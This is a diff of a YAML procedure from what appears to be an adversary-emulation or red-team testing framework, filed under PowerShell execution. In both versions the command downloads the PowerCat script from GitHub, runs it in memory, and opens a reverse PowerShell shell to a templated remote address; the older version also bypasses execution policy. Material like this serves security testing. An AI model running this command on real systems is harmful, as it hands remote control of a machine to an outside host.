@@ -1,6 +1,6 @@
 id: 1ccc757b-cd16-4f62-bf06-91019a9bed44
-name: Execute PowerShell remotely with PowerCat
-description: This procedure downloads PowerCat from Github, then uses it to open a connection to a remote server.
+name: Create remote Powershell with PowerCat
+description: PowerCat is a tool that uses native PowerShell components to allow an attacker to tansfer files, send and serve reverses shells, and relays similar to NetCat over TCP, SMB, and UDP. This procedure downloads PowerCat from Github, then uses it to open a connection to a remote server using PowerShell.
 tactic: execution
 technique:
   id: T1059.001
@@ -9,7 +9,7 @@ platforms:
   windows:
     psh:
       command: |
-        powershell.exe -exec bypass -C "IEX (New-ObjectNet.WebClient).DownloadString(''https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1''); powercat -c #{execution.remote.ip} -p #{execution.remote.port} -e powershell"
+        IEX (New-ObjectNet.WebClient).DownloadString(''https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1''); powercat -c #{execution.remote.ip} -p #{execution.remote.port} -e powershell
 metadata:
   authors:
     - bfuzzy1
